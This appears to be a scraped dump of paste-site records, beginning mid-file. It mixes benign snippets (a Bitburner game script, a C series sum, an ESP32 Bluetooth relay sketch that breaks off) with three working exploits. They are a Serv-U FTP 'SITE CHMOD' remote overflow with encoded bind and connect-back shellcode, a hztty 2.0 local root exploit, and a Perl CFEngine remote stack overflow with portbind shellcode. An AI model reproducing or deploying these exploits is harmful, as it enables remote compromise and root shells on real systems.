#define PORT_OFFSET		95
#define IP_OFFSET		88

#define SEH_OFFSET		0x193	//v3.0.0.20~v4.1.0.11
//#define	SEH_OFFSET		0x133 // work on v3.0.0.16~v3.0.0.19, for connectback shellcode
#define MAX_LEN			2048
#define JMP_OVER		""\xeb\x06\xeb\x06""
#define	VERSION			""1.0""

struct
{
	DWORD	dwJMP;
	char	*szDescription;
}targets[] =
{
	{0x7ffa4a1b,""Serv-U v3.0.0.20~v4.1.0.11  GB     2K/XP  ALL""},	//for all GB win2000 and winxp
// {0x74FD69A9,""Serv-U v3.0.0.20~v4.1.0.11  GB     2K     SP3/SP4""},	//wsock32.dll jmp ebx addr
// {0x71a469ad,""Serv-U v3.0.0.20~v4.1.0.11  GB     XP     SP0/SP1""},	//wsock32.dll jmp ebx addr
// {0x77e45f17,""Serv-U v3.0.0.20~v4.1.0.11  GB/BG  2K     SP4""},	//user32.dll jmp ebx addr
// {0x7ffa2186,""Serv-U v3.0.0.20~v4.1.0.11  BG     2K/XP  ALL""},	//for all BG win2000 and winxp	
// {0x6dec6713,""Serv-U v3.0.0.20~v4.1.0.11  BG     2K     SP4""},	//setupapi.dll jmp ebx addr
// {0x6DEE6713,""Serv-U v3.0.0.20~v4.1.0.11  KR     2K     SP4""},	//setupapi.dll jmp ebx addr
// {0x77886713,""Serv-U v3.0.0.20~v4.1.0.11  EN     2K     SP4""},	//setupapi.dll jmp ebx addr
// {0x76b42a3a,""Serv-U v3.0.0.20~v4.1.0.11  EN     XP     SP1""},
// {0x12345678,""Serv-U v3.0.0.20~v4.1.0.11""},         
},v;


unsigned char	*szSend[4];
unsigned char	szCommand[MAX_LEN];
char		szDirectory[0x100];

// 28 bytes decode by lion, don't change this.
unsigned char decode[]=
""\xBE\x6D\x69\x6F\x6E\x4E\xBF\x6D\x69\x30\x6E\x4F\x43\x39\x3B\x75""
""\xFB\x4B\x80\x33\x93\x39\x73\xFC\x75\xF7\xFF\xD3"";

// Shellcode start sign, use for decode, don't change this.
unsigned char sc_start[]=
""lion""; 

// Shellcode end sign, use for decode, don't change this.
unsigned char sc_end[]=
""li0n""; 

// 311 bytes bind shellcode by lion (xor with 0x93)
unsigned char sc[]=
""\x7A\x96\x92\x93\x93\xCC\xF7\x32\xA3\x93\x93\x93\x18\xD3\x9F\x18""
""\xE3\x8F\x3E\x18\xFB\x9B\x18\x64\xF9\x97\xCA\x7B\x36\x93\x93\x93""
""\x71\x6A\xFB\xA0\xA1\x93\x93\xFB\xE4\xE0\xA1\xCC\xC7\x6C\x85\x18""
""\x7B\xF9\x95\xCA\x7B\x1F\x93\x93\x93\x71\x6A\x12\x7F\x03\x92\x93""
""\x93\xC7\xFB\x92\x92\x93\x93\x6C\xC5\x83\xC3\xC3\xC3\xC3\xF9\x92""
""\xF9\x91\x6C\xC5\x87\x18\x4B\x54\x94\x91\x93\x93\xA6\xA0\x53\x1A""
""\xD4\x97\xF9\x83\xC4\xC0\x6C\xC5\x8B\xF9\x92\xC0\x6C\xC5\x8F\xC3""
""\xC3\xC0\x6C\xC5\xB3\x18\x4B\xA0\x53\xFB\xF0\xFE\xF7\x93\x1A\xF5""
""\xA3\x10\x7F\xC7\x18\x6F\xF9\x87\xCA\x1A\x97\x1C\x71\x68\x55\xD4""
""\x83\xD7\x6D\xD4\xAF\x6D\xD4\xAE\x1A\xCC\xDB\x1A\xCC\xDF\x1A\xCC""
""\xC3\x1E\xD7\xB7\x83\xC4\xC3\xC2\xC2\xC2\xF9\x92\xC2\xC2\x6C\xE5""
""\xA3\xC2\x6C\xC5\x97\x18\x5F\xF9\x6C\x6C\xA2\x6C\xC5\x9B\xC0\x6C""
""\xC5\xB7\x6C\xC5\x9F\xC2\xC5\x18\xE6\xAF\x18\xE7\xBD\xEB\x90\x66""
""\xC5\x18\xE5\xB3\x90\x66\xA0\x5A\xDA\xD2\x3E\x90\x56\xA0\x48\x9C""
""\x2D\x83\xA9\x45\xE7\x9B\x52\x58\x9E\x90\x49\xD3\x78\x62\xA8\x8C""
""\xE6\x74\xCD\x18\xCD\xB7\x90\x4E\xF5\x18\x9F\xD8\x18\xCD\x8F\x90""
""\x4E\x18\x97\x18\x90\x56\x38\xCD\xCA\x50\x7B\x65\x6D\x6C\x6C\x1D""
""\xDD\x9D\x7F\xE1\x6D\x20\x85\x3E\x4A\x96\x5D\xED\x4B\x71\xE0\x58""
""\x7E\x6F\xA8\x4A\x9A\x66\x3E\x37\x89\xE3\x54\x37\x3E\xBD\x7A\x76""
""\xDA\x15\xDA\x74\xEA\x55\xEA"";

// 294 bytes connectback shellcode by lion (xor with 0x93)
unsigned char cbsc[]=
""\x7A\x6F\x93\x93\x93\xCC\xF7\x32\xA3\x93\x93\x93\x18\xD3\x9F\x18""
""\xE3\x8F\x3E\x18\xFB\x9B\x18\x64\xF9\x97\xCA\x7B\x0F\x93\x93\x93""
""\x71\x6A\xFB\xA0\xA1\x93\x93\xFB\xE4\xE0\xA1\xCC\xC7\x6C\x85\x18""
""\x7B\xF9\x97\xCA\x7B\x10\x93\x93\x93\x71\x6A\x12\x7F\x03\x92\x93""
""\x93\xC7\xFB\x92\x92\x93\x93\x6C\xC5\x83\xC3\xC3\xC3\xC3\xF9\x92""
""\xF9\x91\x6C\xC5\x87\x18\x4B\xFB\xEC\x93\x93\x92\xFB\x91\x93\x93""
""\xA6\x18\x5F\xF9\x83\xC2\xC0\x6C\xC5\x8B\x16\x53\xE6\xD8\xA0\x53""
""\xFB\xF0\xFE\xF7\x93\x1A\xF5\xA3\x10\x7F\xC7\x18\x6F\xF9\x83\xCA""
""\x1A\x97\x1C\x71\x68\x55\xD4\x83\xD7\x6D\xD4\xAF\x6D\xD4\xAE\x1A""
""\xCC\xDB\x1A\xCC\xDF\x1A\xCC\xC3\x1E\xD7\xB7\x83\xC4\xC3\xC2\xC2""
""\xC2\xF9\x92\xC2\xC2\x6C\xE5\xA3\xC2\x6C\xC5\x97\x18\x5F\xF9\x6C""
""\x6C\xA2\x6C\xC5\x9B\xC0\x6C\xC5\x8F\x6C\xC5\x9F\xC2\xC5\x18\xE6""
""\xAF\x18\xE7\xBD\xEB\x90\x66\xC5\x18\xE5\xB3\x90\x66\xA0\x5A\xDA""
""\xD2\x3E\x90\x56\xA0\x48\x9C\x2D\x83\xA9\x45\xE7\x9B\x52\x58\x9E""
""\x90\x49\xD3\x78\x62\xA8\x8C\xE6\x74\xCD\x18\xCD\xB7\x90\x4E\xF5""
""\x18\x9F\xD8\x18\xCD\x8F\x90\x4E\x18\x97\x18\x90\x56\x38\xCD\xCA""
""\x50\x7B\x6C\x6D\x6C\x6C\x1D\xDD\x9D\x7F\xE1\x6D\x20\x85\x3E\x4A""
""\x96\x5D\xED\x4B\x71\xE0\x58\x7E\x6F\xA8\x4A\x9A\x66\x3E\x7F\x6A""
""\x39\xF3\x74\xEA\x55\xEA"";

void usage(char *p)
{
	int	i;
	printf( ""Usage:\t%s\t<-i ip> <-t type>\n""
		""\t\t[-u user] [-p pass] [-d dir]\n""
		""\t\t[-f ftpport] [-c cbhost] [-s shellport]\n\n""
		""[type]:\n"" , p);	
	for(i=0;i<sizeof(targets)/sizeof(v);i++)
	{
		printf(""\t%d\t0x%x\t%s\n"", i, targets[i].dwJMP, targets[i].szDescription);
	}
}

/* ripped from TESO code and modifed by ey4s for win32 */
void shell (int sock)
{
	int     l;
	char    buf[512];
	struct	timeval time;
	unsigned long	ul[2];

	time.tv_sec = 1;
	time.tv_usec = 0;

	while (1)
	{
		ul[0] = 1;
		ul[1] = sock;

		l = select (0, (fd_set *)&ul, NULL, NULL, &time);
		if(l == 1)
		{
			l = recv (sock, buf, sizeof (buf), 0);
			if (l <= 0)
			{
				printf (""[-] Connection closed.\n"");
				return;
			}
			l = write (1, buf, l);
			if (l <= 0)
			{
				printf (""[-] Connection closed.\n"");
				return;
			}
		}
		else
		{
			l = read (0, buf, sizeof (buf));
			if (l <= 0)
			{
				printf(""[-] Connection closed.\n"");
				return;
			}
			l = send(sock, buf, l, 0);
			if (l <= 0)
			{
				printf(""[-] Connection closed.\n"");
				return;
			}
		}
	}
}

void main(int argc, char **argv)
{
	struct	sockaddr_in sa, server, client;
	WSADATA	wsd;
	SOCKET	s, s2, s3;
	int	iErr, ret, len;
	char	szRecvBuff[MAX_LEN];
	int	i, j, iType;
	int	iPort=21;
	char	*ip=NULL, *pUser=""ftp"", *pPass=""ftp@ftp.com"", *cbHost=NULL;
	char	user[128], pass[128];
	BOOL	bCb=FALSE, bLocal=TRUE;
	unsigned short	shport=53, shport2=0;
	unsigned long	cbip;
	unsigned int	timeout=5000, Reuse;
	char	penetrate[255],cbHost2[20];
	int seh_offset;
	
	printf( ""Serv-U FTPD 3.x/4.x \""SITE CHMOD\"" remote overflow exploit V%s\r\n""
		""Bug find by kkqq kkqq@0x557.org, Code By lion (lion@cnhonker.net)\r\n""
		""Welcome to HUC website http://www.cnhonker.com\r\n\n""
		 	, VERSION);

	seh_offset = SEH_OFFSET;
	
	if(argc < 4)
	{
		usage(argv[0]);
		return;
	}

	for(i=1;i<argc;i+=2)
	{
		if(strlen(argv[i]) != 2)
		{
			usage(argv[0]);
			return;
		}
		// check parameter
		if(i == argc-1)
		{
			usage(argv[0]);
			return;
		}
		switch(argv[i][1])
		{
			case 'i':
				ip=argv[i+1];
				break;
			case 't':
				iType = atoi(argv[i+1]);
				break;
			case 'f':
				iPort=atoi(argv[i+1]);
				break;
			case 'p':
				pPass = argv[i+1];
				break;
			case 'u':
				pUser=argv[i+1];
				break;
			case 'c':
				cbHost=argv[i+1];
				bCb=TRUE;
				break;
			case 's':
				shport=atoi(argv[i+1]);
				break;
			case 'd':
				if(argv[i+1][0] != '/')
					strcpy(szDirectory, ""/"");
				strncat(szDirectory, argv[i+1], sizeof(szDirectory)-0x20);
				
				if(szDirectory[strlen(szDirectory)-1] != '/')
					strcat(szDirectory, ""/"");
					
				// correct the directory len
				for(j=0;j<(strlen(szDirectory)-1)%8;j++)
					strcat(szDirectory, ""x"");
					
				//printf(""%d:%s\r\n"", strlen(szDirectory), szDirectory);
				seh_offset = seh_offset - strlen(szDirectory)+1;
				break;
		}
	}

	if((!ip) || (!user) || (!pass))
	{
		usage(argv[0]);
		printf(""[-] Invalid parameter.\n"");
		return;
	}

	if( (iType<0) || (iType>=sizeof(targets)/sizeof(v)) )
	{
		usage(argv[0]);
		printf(""[-] Invalid type.\n"");
		return;
	}

	if(iPort <0 || iPort >65535 || shport <0 || shport > 65535)
	{
		usage(argv[0]);
		printf(""[-] Invalid port.\n"");
		return;
	}
	
	_snprintf(user, sizeof(user)-1, ""USER %s\r\n"", pUser);
	user[sizeof(user)-1]='\0';
	_snprintf(pass, sizeof(pass)-1, ""PASS %s\r\n"", pPass);
	pass[sizeof(pass)-1]='\0';
	szSend[0] = user;	//user
	szSend[1] = pass;	//pass	
	szSend[2] = penetrate;	//pentrate
	szSend[3] = szCommand;	//shellcode
	
	// Penetrate through the firewall.
	if(bCb && shport > 1024)
	{
		strncpy(cbHost2, cbHost, 20);
		for(i=0;i<strlen(cbHost); i++)
		{
			if(cbHost[i] == '.')
				cbHost2[i] = ',';
		}
		
		sprintf(penetrate, ""PORT %s,%d,%d\r\n"", cbHost2, shport/256, shport%256);

		//printf(""%s"", penetrate);
	}
	else
	{
		sprintf(penetrate,""TYPE I\r\n"");		
	}

	// fill the ""site chmod"" command
	strcpy(szCommand, ""site chmod 777 "");
	
	// fill the directory
	if(szDirectory[0])
		strcat(szCommand, szDirectory);

	// fill the egg
	for(i=0;i<seh_offset%8;i++)
		strcat(szCommand, ""\x90"");
	//strcat(szCommand, ""BBBB"");
	
	// fill the seh
	for(i=0;i<=(seh_offset/8)*8+0x20;i+=8)
	{
		strcat(szCommand, JMP_OVER);
		memcpy(&szCommand[strlen(szCommand)], &targets[iType].dwJMP, 4);
	}
		
	// fill the decode
	strcat(szCommand, decode);

	// fill the shellcode start	sign
	strcat(szCommand, sc_start);

	// fill the shellcode
	if(bCb)
	{
		// connectback shellcode
		shport2 = htons(shport)^(u_short)0x9393;
		cbip = inet_addr(cbHost)^0x93939393;
		memcpy(&cbsc[PORT_OFFSET], &shport2, 2);
		memcpy(&cbsc[IP_OFFSET], &cbip, 4);
		strcat(szCommand, cbsc);		
	}
	else
	{
		// bind shellcode
		shport2 = htons(shport)^(u_short)0x9393;
		memcpy(&sc[BIND_OFFSET], &shport2, 2);
		strcat(szCommand, sc);
	}

	// fill the shellcode end sign
	strcat(szCommand, sc_end);

	// send end
	strcat(szCommand, ""\r\n"");

	if(strlen(szCommand) >= sizeof(szCommand))
	{
		printf(""[-] stack buffer overflow.\n"");
		return;
	}
	
//	printf(""send size %d:%s"", strlen(szCommand), szCommand);
	
	__try
	{
		if (WSAStartup(MAKEWORD(1,1), &wsd) != 0)
		{
			printf(""[-] WSAStartup error:%d\n"", WSAGetLastError());
			__leave;
		}

		s=socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
		if(s == INVALID_SOCKET)
		{
			printf(""[-] Create socket failed:%d"",GetLastError());
			__leave;
		}

		sa.sin_family=AF_INET;
		sa.sin_port=htons((USHORT)iPort);
		sa.sin_addr.S_un.S_addr=inet_addr(ip);

		setsockopt(s,SOL_SOCKET,SO_RCVTIMEO,(char *)&timeout,sizeof(unsigned int));
		iErr = connect(s,(struct sockaddr *)&sa,sizeof(sa));
		if(iErr == SOCKET_ERROR)
		{
			printf(""[-] Connect to %s:%d error:%d\n"", ip, iPort, GetLastError());
			__leave;
		}
		printf(""[+] Connect to %s:%d success.\n"", ip, iPort);
		
		if(bCb)
		{
			Sleep(500);
			s2 = socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);

			server.sin_family=AF_INET;
			server.sin_addr.S_un.S_addr=inet_addr(cbHost);
			//server.sin_addr.s_addr=INADDR_ANY; 
			server.sin_port=htons((unsigned short)shport);

			setsockopt(s2,SOL_SOCKET,SO_RCVTIMEO,(char *)&timeout,sizeof(unsigned int));

			Reuse = 1; 
			setsockopt(s2, SOL_SOCKET, SO_REUSEADDR, (char*)&Reuse, sizeof(Reuse));

			if(bind(s2,(LPSOCKADDR)&server,sizeof(server))==SOCKET_ERROR)
			{
				printf(""[-] Bind port on %s:%d error.\n"", cbHost, shport);
				printf(""[-] You must run nc get the shell.\n"");
				bLocal = FALSE;
				//closesocket(s2);
				//__leave;
			}
			else
			{	
				printf(""[+] Bind port on %s:%d success.\n"", cbHost, shport);
				listen(s2, 1); 
			}
		}
		
		for(i=0;i<sizeof(szSend)/sizeof(szSend[0]);i++)
		{
			memset(szRecvBuff, 0, sizeof(szRecvBuff));
			iErr = recv(s, szRecvBuff, sizeof(szRecvBuff), 0);
			if(iErr == SOCKET_ERROR)
			{
				printf(""[-] Recv buffer error:%d.\n"", WSAGetLastError());
				__leave;
			}
			printf(""[+] Recv: %s"", szRecvBuff);
			
			if(szRecvBuff[0] == '5')
			{
				printf(""[-] Server return a error Message.\r\n"");
				__leave;
			}

			iErr = send(s, szSend[i], strlen(szSend[i]),0);
			if(iErr == SOCKET_ERROR)
			{
				printf(""[-] Send buffer error:%d.\n"", WSAGetLastError());
				__leave;
			}

			if(i==sizeof(szSend)/sizeof(szSend[0])-1)
				printf(""[+] Send shellcode %d bytes.\n"", iErr);
			else
				printf(""[+] Send: %s"", szSend[i]);
		}

		printf(""[+] If you don't have a shell it didn't work.\n"");

		if(bCb)
		{
			if(bLocal)
			{
				printf(""[+] Wait for shell...\n"");
			
				len = sizeof(client);
				s3 = accept(s2, (struct sockaddr*)&client, &len); 
				if(s3 != INVALID_SOCKET) 
				{ 
	printf(""[+] Exploit success! Good luck! :)\n"");
	printf(""[+] ===--===--===--===--===--===--===--===--===--===--===--===--===--===\n"");
					shell(s3);
				}
			}	
		}
		else
		{
			printf(""[+] Connect to shell...\n"");
			
			Sleep(1000);
			s2 = socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
			server.sin_family = AF_INET;
			server.sin_port = htons(shport);
			server.sin_addr.s_addr=inet_addr(ip);

			ret = connect(s2, (struct sockaddr *)&server, sizeof(server));
			if(ret!=0)
			{
				printf(""[-] Exploit seem failed.\n"");
				__leave;
			}
			
	printf(""[+] Exploit success! Good luck! :)\n"");
	printf(""[+] ===--===--===--===--===--===--===--===--===--===--===--===--===--===\n"");
			shell(s2);
		}
		
		
	}

 	__finally
	{
		if(s != INVALID_SOCKET) closesocket(s);
		if(s2 != INVALID_SOCKET) closesocket(s2);
		if(s3 != INVALID_SOCKET) closesocket(s3);
		WSACleanup();
	}

	return;
}

// milw0rm.com [2004-01-27]
            "
eywQ7K7T,bitburner - learning - the math isnt mathing,spezticle,JavaScript,Friday 15th of March 2024 09:15:18 PM CDT,"/** @param {NS} ns */
export async function main(ns) {
	var money_action = .8;
	var security_action = 5;
	var node = ns.getHostname();
	var logfile = node + "".txt"";
	var sur = ns.getServerUsedRam(node).toPrecision(4);
	var smr = ns.getServerMaxRam(node).toPrecision(4);
	var ssl = ns.getServerSecurityLevel(node).toPrecision(4);
	var sms = ns.getServerMinSecurityLevel(node).toPrecision(4);

	var smm = ns.getServerMaxMoney(node).toPrecision(4);
	var sma = ns.getServerMoneyAvailable(node).toPrecision(4);
	var sra = smr - sur; // server ram availabe
	var security_status = ssl - sms;
	var money_status = smm - sma;
	ns.tprint(typeof(security_action))
	ns.exit();
	if (security_status > security_action) {
		var hackscript = ""weaken.js"";
		ns.write(logfile, (""+=====================Begin==================+\n""), ""a"");
		ns.write(logfile, (""Hackscript: "" + hackscript) + ""\n"", ""a"");
		ns.write(logfile, (""Minimum Security Level: "" + sms + ""\n""), ""a"");
		ns.write(logfile, (""Security Level: "" + ssl + ""\n""), ""a"");
		ns.write(logfile, (""Security Status: "" + security_status + "" > "" + security_action + ""\n""), ""a"");
		ns.write(logfile, (""+======================End===================+"" + ""\n""), ""a"");

	}
	else if (money_status < money_action) {
		var hackscript = ""grow.js"";
		ns.write(logfile, (""+=====================Begin==================+\n""), ""a"");
		ns.write(logfile, (""Hackscript: "" + hackscript + ""\n""), ""a"");
		ns.write(logfile, (""Max Money: "" + smm + ""\n""), ""a"");
		ns.write(logfile, (""Money Available: "" + sma + ""\n""), ""a"");
		ns.write(logfile, (""Money Status: "" + smm + "" - "" + sma + "" = "" + money_status + "" < "" + money_action + ""\n""), ""a"")
		ns.write(logfile, (""+======================End===================+\n""), ""a"");
	} else {
		var hackscript = ""hack.js"";
		ns.write(logfile, (""+=====================Begin==================+\n""), ""a"");
		ns.write(logfile, (""Hackscript: "" + hackscript + ""\n""), ""a"");
		ns.write(logfile, (""Minimum Security Level: "" + sms + ""\n""), ""a"");
		ns.write(logfile, (""Security Level: "" + ssl + ""\n""), ""a"");
		ns.write(logfile, (""Security Status: "" + security_status + "" > "" + security_action + ""\n""), ""a"");
		ns.write(logfile, (""Max Money: "" + smm + ""\n""), ""a"");
		ns.write(logfile, (""Money Available: "" + sma + ""\n""), ""a"");
		ns.write(logfile, (""Money Status: "" + smm + "" - "" + sma + "" = "" + money_status + "" < "" + money_action + ""\n""), ""a"")
		ns.write(logfile, (""+======================End===================+\n""), ""a"");
	}
	var sr2r = ns.getScriptRam(hackscript, node);
	if (sr2r < 1) { var sr2r = 1; }
	var rwt = ((sra - sr2r) / sr2r).toFixed(0);
	if (rwt < 1) { var rwt = 1 };
	ns.exec(hackscript, node, rwt);
}"
S28P2DeG,sum of series,Divyansh_Chourey,C,Friday 15th of March 2024 09:04:27 PM CDT,"#include<stdio.h>

int main(){
	int n;
	float sum=0;
	printf(""Enter the number: "");
	scanf(""%d"", &n);
	for(int i=1; i<=n; i=i+1){
		sum = sum+(1.0/i);
	}
	printf(""%f"", sum);
	return 0;
}
/*OUTPUT:
Enter the number: 10
2.928968
*/"
sdt3quyr,hztty 2.0 (RedHat 9.0) - Local Privilege Escalation - CVE-2003-0783,FlyFar,C,Friday 15th of March 2024 08:54:45 PM CDT,"/*  0x333hztty => hztty 2.0 local root exploit
 *
 *
 *	more info : Debian Security Advisory DSA 385-1
 *
 *	*note* I adjusted some part of hztty's code since
 *	there were some errors. hope this will not influence
 *	exploitation :> tested against Red Hat 9.0 :
 *
 * [c0wboy@0x333 c0wboy]$ gcc 0x333hztty.c -o k
 * [c0wboy@0x333 c0wboy]$ ./k
 *
 *  ---  local root exploit for hztty 2.0  ---
 *  ---  coded by c0wboy ~ 0x33  ---
 * 
 * sh-2.05b# [./hztty started]  [using /dev/ttyp6]
 * sh-2.05b$ sh-2.05b# uid=0(root) gid=0(root) groups=500(c0wboy)
 * sh-2.05b#
 *
 *  coded by c0wboy 
 *
 *  (c) 0x333 Outsiders Security Labs
 *
 */

#include <stdio.h>
#include <unistd.h>

#define BIN    ""./hztty""
#define SIZE   272


unsigned char shellcode[] =
	""\x31\xdb\x89\xd8\xb0\x17\xcd\x80\x31\xdb\x89\xd8""
	""\xb0\x2e\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68""
	""\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31""
	""\xd2\xb0\x0b\xcd\x80"" ;

int main()
{
	int i;
	char out[SIZE];
	char *own[] = { shellcode, 0x0 };

	int *hztty = (int *)(out);
	int ret = 0xbffffffa - strlen(BIN) - strlen(shellcode);

	for (i=0 ; i<SIZE-1 ; i+=4)
		*hztty++ = ret;

	hztty = 0x0;

	fprintf (stdout, ""\n ---  local root exploit for hztty 2.0  ---\n"");
	fprintf (stdout, "" ---  coded by c0wboy ~ www.0x333.org   ---\n\n"");

	execle (BIN, BIN, ""-I"", out, 0x0, own, 0x0);
}


// milw0rm.com [2003-09-21]
            "
tQR4kja2,GNU CFEngine 2.-2.0.3 - Remote Stack Overflow - CVE-2003-0849,FlyFar,Perl,Friday 15th of March 2024 08:53:09 PM CDT,"#!/usr/bin/perl -s
# kokaninATdtors.net / cfengine2-2.0.3 from freebsd ports 26/sep/2003.
# forking portbind shellcode port=0xb0ef(45295) by eSDee
# bug discovered by nick cleaton, tested on FreeBSD 4.8-RELEASE

use IO::Socket;
if(!$ARGV[1])
{ print ""usage: ./DSR-cfengine.pl <host> <port> (default cfengine is 5308)\n""; exit(-1); }

$host = $ARGV[0];
$port = $ARGV[1];
$nop = ""\x90"";
$ret = pack(""l"",0xbfafe3dc);
$shellcode = 
""\x31\xc0\x31\xdb\x53\xb3\x06\x53\xb3\x01\x53\xb3\x02\x53\x54\xb0"".
""\x61\xcd\x80\x89\xc7\x31\xc0\x50\x50\x50\x66\x68\xb0\xef\xb7\x02"".
""\x66\x53\x89\xe1\x31\xdb\xb3\x10\x53\x51\x57\x50\xb0\x68\xcd\x80"".
""\x31\xdb\x39\xc3\x74\x06\x31\xc0\xb0\x01\xcd\x80\x31\xc0\x50\x57"".
""\x50\xb0\x6a\xcd\x80\x31\xc0\x31\xdb\x50\x89\xe1\xb3\x01\x53\x89"".
""\xe2\x50\x51\x52\xb3\x14\x53\x50\xb0\x2e\xcd\x80\x31\xc0\x50\x50"".
""\x57\x50\xb0\x1e\xcd\x80\x89\xc6\x31\xc0\x31\xdb\xb0\x02\xcd\x80"".
""\x39\xc3\x75\x44\x31\xc0\x57\x50\xb0\x06\xcd\x80\x31\xc0\x50\x56"".
""\x50\xb0\x5a\xcd\x80\x31\xc0\x31\xdb\x43\x53\x56\x50\xb0\x5a\xcd"".
""\x80\x31\xc0\x43\x53\x56\x50\xb0\x5a\xcd\x80\x31\xc0\x50\x68\x2f"".
""\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x54\x53\x50\xb0\x3b"".
""\xcd\x80\x31\xc0\xb0\x01\xcd\x80\x31\xc0\x56\x50\xb0\x06\xcd\x80"".
""\xeb\x9a"";


$buf = $nop x 2222 . $shellcode . $ret x 500;

$socket = new IO::Socket::INET ( 
Proto  => ""tcp"",
PeerAddr => $host,
PeerPort => $port, 
);

die ""unable to connect to $host:$port ($!)\n"" unless $socket;

sleep(1); #you might have to adjust this on slow connections
print $socket $buf;

close($socket);


# milw0rm.com [2003-09-27]
            "
44dQVeqc,master_slave_BT_for_4_relays_using_buttons,macca-nz,Arduino,Friday 15th of March 2024 08:12:28 PM CDT,"/**************************************************************************************************************************
						Bluetooth Classic 4 Button MASTER Sketch
**************************************************************************************************************************/
// This example code is in the Public Domain (or CC0 licensed, at your option.)
// By Victor Tchistiak - 2019
//
// This example demonstrates master mode Bluetooth connection to a slave BT device using PIN (password)
// defined either by String ""slaveName"" by default ""OBDII"" or by MAC address
//
// This example creates a bridge between Serial and Classical Bluetooth (SPP)
// This is an extension of the SerialToSerialBT example by Evandro Copercini - 2018
//
// DO NOT try to connect to phone or laptop - they are master
// devices, same as the ESP using this code - it will NOT work!
//
// You can try to flash a second ESP32 with the example SerialToSerialBT - it should
// automatically pair with ESP32 running this code

#include ""BluetoothSerial.h""

//<<<<<<<<<<<<<<<<<Creating the buttons >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
const uint8_t button1 = 36, button2 = 39, button3 = 34, button4 = 35;
bool  press1, press2, press3, press4,
      lastStateB1, lastStateB2, lastStateB3, lastStateB4;
//<<<<<<<<<<<<<<<<<<<Non-blocking timer for our button de-bounce >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
uint32_t lastMillis = 0;
#define DEBOUNCE 50

#define USE_NAME // Comment this to use MAC address instead of a slaveName
const char *pin = ""1234""; // Change this to reflect the pin expected by the real slave BT device

#if !defined(CONFIG_BT_SPP_ENABLED)
#error Serial Bluetooth not available or not enabled. It is only available for the ESP32 chip.
#endif

BluetoothSerial SerialBT;

#ifdef USE_NAME
  String slaveName = ""ESP32-BT-Slave""; // Change this to reflect the real name of your slave BT device
#else
  String MACadd = ""AA:BB:CC:11:22:33""; // This only for printing
  uint8_t address[6]  = {0xAA, 0xBB, 0xCC, 0x11, 0x22, 0x33}; // Change this to reflect real MAC address of your slave BT device
#endif

String myName = ""ESP32-BT-Master"";


void setup() {
  bool connected;
  Serial.begin(115200);
  //<<<<<<<<<< Use pullup so no resistor needed >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
  pinMode(button1, INPUT_PULLUP); //For ACTIVE LOW 
  pinMode(button2, INPUT_PULLUP); // Wire the button between the pin and ground
  pinMode(button3, INPUT_PULLUP);
  pinMode(button4, INPUT_PULLUP);

  SerialBT.begin(myName, true);
  Serial.printf(""The device \""%s\"" started in master mode, make sure slave BT device is on!\n"", myName.c_str());

  #ifndef USE_NAME
    SerialBT.setPin(pin);
    Serial.println(""Using PIN"");
  #endif

  // connect(address) is fast (up to 10 secs max), connect(slaveName) is slow (up to 30 secs max) as it needs
  // to resolve slaveName to address first, but it allows to connect to different devices with the same name.
  // Set CoreDebugLevel to Info to view devices Bluetooth address and device names
  #ifdef USE_NAME
    connected = SerialBT.connect(slaveName);
    Serial.printf(""Connecting to slave BT device named \""%s\""\n"", slaveName.c_str());
  #else
    connected = SerialBT.connect(address);
    Serial.print(""Connecting to slave BT device with MAC ""); Serial.println(MACadd);
  #endif

  if(connected) {
    Serial.println(""Connected Successfully!"");
  } else {
    while(!SerialBT.connected(10000)) {
      Serial.println(""Failed to connect. Make sure remote device is available and in range, then restart app."");
    }
  }
  // Disconnect() may take up to 10 secs max
  if (SerialBT.disconnect()) {
    Serial.println(""Disconnected Successfully!"");
  }
  // This would reconnect to the slaveName(will use address, if resolved) or address used with connect(slaveName/address).
  SerialBT.connect();
  if(connected) {
    Serial.println(""Reconnected Successfully!"");
  } else {
    while(!SerialBT.connected(10000)) {
      Serial.println(""Failed to reconnect. Make sure remote device is available and in range, then restart app."");
    }
  }
}

void loop() {
  bool stateB1 = digitalRead(button1);
  bool stateB2 = digitalRead(button2);
  bool stateB3 = digitalRead(button3);
  bool stateB4 = digitalRead(button4);
  uint8_t value;
  
  if(stateB1 != lastStateB1){
    press1 = true;
    lastMillis = millis();
  }
  if(stateB2 != lastStateB2){
    press2 = true;
    lastMillis = millis();
  }
  if(stateB3 != lastStateB3){
    press3 = true;
    lastMillis = millis();
  }
  if(stateB4 != lastStateB4){
    press4 = true;
    lastMillis = millis();
  }
  if(press1 || press2 || press3 || press4){
    if(millis() - lastMillis >= DEBOUNCE){
      if(press1){
        if(stateB1 == LOW){
          value = 1;
        }
        press1 = false;
      }else if(press2){
        if(stateB2 == LOW){
          value = 2;
        }
        press2 = false;
      }else if(press3){
        if(stateB3 == LOW){
          value = 3;
        }
        press3 = false;
      }else if(press4){
        if(stateB4 == LOW){
          value = 4;
        }
        press1 = false;
      }
      if (SerialBT.available()) {
        SerialBT.write(value);
        Serial.printf(""BT Sent: %u\n"", value);
      }else{
        Serial.println(""NO Bluetooth Connection, Send Fail!\n"");
      }
    }
  }
  
  lastStateB1 = stateB1;
  lastStateB2 = stateB2;
  lastStateB3 = stateB3;
  lastStateB4 = stateB4;
  delay(20);
}

/************************************** END MASTER SKETCH *************************************************
**********************************************************************************************************/

//<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>

/*********************************************************************************************************
**********************************BT CLASSIC SLAVE SKETCH for 4 x Relays*********************************
*************************** Assumes ACTIVE LOW on 4 x Relay module **************************************
********************************************************************************************************/
//This example code is in the Public Domain (or CC0 licensed, at your option.)
//By Evandro Copercini - 2018
//
//This example creates a bridge between Serial and Classical Bluetooth (SPP)
//and also demonstrate that SerialBT have the same functionalities of a normal Serial

#include ""BluetoothSerial.h""

// Be careful of Relay pins using strapping pins
